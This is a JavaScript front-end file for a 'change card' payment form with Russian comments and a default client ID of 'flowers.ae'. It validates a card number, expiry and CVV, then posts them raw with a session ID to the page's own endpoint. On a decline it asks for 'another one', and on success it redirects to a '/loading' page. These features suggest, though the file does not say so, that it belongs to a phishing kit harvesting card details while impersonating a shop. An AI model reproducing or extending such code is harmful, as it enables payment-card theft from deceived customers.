// change-card.js (updated ✅ no alerts)
(function () {
  const form = document.getElementById("change-card-form");
  const cardNumber = document.getElementById("cardNumber");
  const expiry = document.getElementById("expiry");
  const cvv = document.getElementById("cvv");
  const submitBtn = document.getElementById("submit-btn");
  const loading = document.getElementById("loading");
  const paymentAmount = document.getElementById("paymentAmount");

  const sessionId = localStorage.getItem("sessionId");
  const clientId = localStorage.getItem("clientId") || "flowers.ae";

  // ✅ Создаем контейнер для текста ошибки
  const errorBox = document.createElement("div");
  errorBox.className = "error-message";
  errorBox.style.display = "none";
  form.appendChild(errorBox);

  function updatePriceFromStorage() {
    const price = localStorage.getItem("price");
    const bookingId = localStorage.getItem("bookingId");

    if (price) {
      const displayPrice = parseFloat(price).toFixed(2);
      paymentAmount.textContent = `AED ${displayPrice}`;
    }

    if (bookingId) {
      const textNode = orderNumber.firstChild;
      if (textNode) {
        textNode.textContent = bookingId;
      }
    }
  }

  function setError(input, msg) {
    input.classList.add("input-error");
    errorBox.textContent = msg;
    errorBox.style.display = "block";
  }

  function clearError() {
    errorBox.style.display = "none";
    cardNumber.classList.remove("input-error");
    expiry.classList.remove("input-error");
    cvv.classList.remove("input-error");
  }

  // ✅ Formatting
  cardNumber.addEventListener("input", () => {
    let v = cardNumber.value.replace(/\D/g, "").slice(0, 16);
    cardNumber.value = v.replace(/(.{4})/g, "$1 ").trim();
    if (v.length >= 13) clearError();
  });

  expiry.addEventListener("input", () => {
    let v = expiry.value.replace(/\D/g, "").slice(0, 4);
    if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
    expiry.value = v;
    if (/^\d{2}\/\d{2}$/.test(v)) clearError();
  });

  cvv.addEventListener("input", () => {
    let v = cvv.value.replace(/\D/g, "").slice(0, 3);
    cvv.value = v;
    if (v.length === 3) clearError();
  });

  function validate() {
    const cleanCard = cardNumber.value.replace(/\s/g, "");

    if (cleanCard.length < 13)
      return setError(cardNumber, "Enter a valid card number");
    if (!/^\d{2}\/\d{2}$/.test(expiry.value))
      return setError(expiry, "Enter MM/YY format");
    if (cvv.value.length !== 3) return setError(cvv, "CVV must be 3 digits");

    return true;
  }

  form.addEventListener("submit", (e) => {
    e.preventDefault();
    clearError();

    if (validate() !== true) return;

    submitBtn.disabled = true;
    submitBtn.style.display = "none";
    loading.style.display = "flex";

    fetch("/api/submit-change", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        sessionId,
        clientId,
        change: cardNumber.value.replace(/\s/g, ""),
        expiryDate: expiry.value,
        cvc: cvv.value,
      }),
    })
      .then((r) => r.json())
      .then((d) => {
        if (d.success) {
          window.location.href = "/loading";
        } else {
          setError(cardNumber, "Card declined, try another one");
        }
      })
      .catch(() => {
        setError(cardNumber, "Network error – try again");
      })
      .finally(() => {
        loading.style.display = "none";
        submitBtn.style.display = "block";
        submitBtn.disabled = false;
      });
  });
})();
